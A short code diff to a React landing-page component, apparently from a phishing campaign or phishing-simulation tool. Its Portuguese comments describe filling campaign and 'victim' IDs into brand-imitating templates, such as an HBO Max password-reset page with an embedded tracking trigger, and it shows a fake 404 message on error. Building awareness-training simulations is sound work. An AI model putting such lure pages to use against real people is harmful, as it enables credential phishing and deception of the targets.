@@ -22,15 +22,17 @@ export default function LandingPage() {
             })
             .then(data => {
                 if (data && data.conteudoHtml) {
-                    // Preenche os inputs hidden dinamicamente com os dados da vítima
+                    // Preenche os placeholders dinamicamente com os dados da vítima.
+                    // {{CAMPAIGN_ID}} e {{TARGET_ID}} alimentam o gatilho de telemetria
+                    // embutido no <form> dos moldes (ex.: HBO Max - Redefinição de Senha).
                     const processedHtml = data.conteudoHtml
                         .replace(/{{CAMPAIGN_ID}}/g, campaignId)
                         .replace(/{{TARGET_ID}}/g, targetId);
-                        
+
                     setHtmlContent(processedHtml);
                 }
             })
-            .catch(() => 
+            .catch(() =>
                 setHtmlContent('<div style="padding: 2rem; text-align: center; font-family: sans-serif; color: red;">Erro 404: Página não encontrada ou link expirado.</div>')
             );
     }, [id, campaignId, targetId]);
